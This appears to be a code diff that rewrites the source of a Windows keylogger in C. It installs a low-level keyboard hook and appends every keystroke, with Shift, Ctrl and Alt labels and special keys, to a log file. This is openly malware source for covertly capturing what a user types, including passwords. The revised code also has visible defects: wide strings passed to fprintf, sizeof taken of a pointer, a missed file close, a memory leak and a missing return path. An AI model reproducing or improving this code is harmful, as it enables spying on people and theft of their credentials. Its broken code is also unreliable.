@@ -1,38 +1,79 @@
 #include"Header.h"
 
-int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
-	HHOOK hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LogKey, NULL, NULL);
-	MSG msg = { 0 };
-	while (GetMessageW(&msg, NULL, 0, 0)) {
-		TranslateMessage(&msg);
-		DispatchMessageW(&msg);
-	}
-	UnhookWindowsHookEx(hHook);
+int main()
+{
+    // Set up the low-level keyboard hook
+    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, &LogKey, NULL, 0);
+
+    // Run the message loop
+    MSG message;
+    while (GetMessage(&message, NULL, 0, 0))
+    {
+        TranslateMessage(&message);
+        DispatchMessage(&message);
+    }
+
+    // Unhook the keyboard hook
+    UnhookWindowsHookEx(hook);
+    return 0;
 }
 
-BOOL isCaps(void) {
-	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^
-		(GetKeyState(VK_SHIFT) & 0x800) != 0)
-		return TRUE;
-	return FALSE;
-}
+// This is the callback function for the low-level keyboard hook
+LRESULT CALLBACK LogKey(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    // Check if the event is a keydown event
+    if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
+    {
+        // Get a pointer to the KBDLLHOOKSTRUCT
+        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
 
-LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam) {
-	if (wParam == WM_KEYDOWN) {
-		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam;
-		WORD KeyLayout = LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0)));
-		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16;
-		if (!(pHook->vkCode <= 32))
-			iKey |= 0x1 << 24;
-		LPWSTR KeyString = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
-		if (wcslen(KeyString) > 1) {
-			WriteToFile(L"[");
-			WriteToFile(KeyString);
-			WriteToFile(L"]");
-		}
-		else {
-			if (!isCaps()) KeyString[0] = tolower(KeyString[0]);
+        // Get the state of the key
+        BYTE keyState[256];
+        GetKeyboardState(keyState);
 
-		}
-	}
+        // Translate the virtual key code and scan code into a Unicode character
+        LPWSTR buffer = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
+
+        // Check if the translation was successful
+        FILE* fp = NULL;
+        _wfopen_s(&fp, PATH, L"ab");
+        if (p->vkCode >= VK_F1 && p->vkCode <= VK_F24)
+        {
+            fprintf(fp, L"[F%d] ", p->vkCode - VK_F1 + 1);
+
+        }
+        else
+        {
+            switch (p->vkCode)
+            {
+            case VK_RETURN:
+                fprintf(fp, L"Enter\n");
+                break;
+            case VK_BACK:
+                fprintf(fp, L"Backspace\n");
+                break;
+            case VK_SPACE:
+                fprintf(fp, L"Space\n");
+                break;
+            case VK_TAB:
+                fprintf(fp, L"Tab\n");
+                break;
+            default:
+               
+                ToUnicode(p->vkCode, p->scanCode, keyState, buffer, sizeof(buffer) / sizeof(WCHAR), 0);
+                 if (GetKeyState(VK_SHIFT) & 0x8000)
+                    fprintf(fp, L"Shift+");
+                else if (GetKeyState(VK_CONTROL) & 0x8000)
+                    fprintf(fp, L"Ctrl+");
+                else if (GetKeyState(VK_MENU) & 0x8000)
+                    fprintf(fp, L"Alt+");
+                fwrite(buffer, sizeof(WCHAR), wcslen(buffer), fp);
+               
+                break;
+            }
+            fclose(fp);
+        }
+
+        return CallNextHookEx(NULL, nCode, wParam, lParam);
+    }
 }
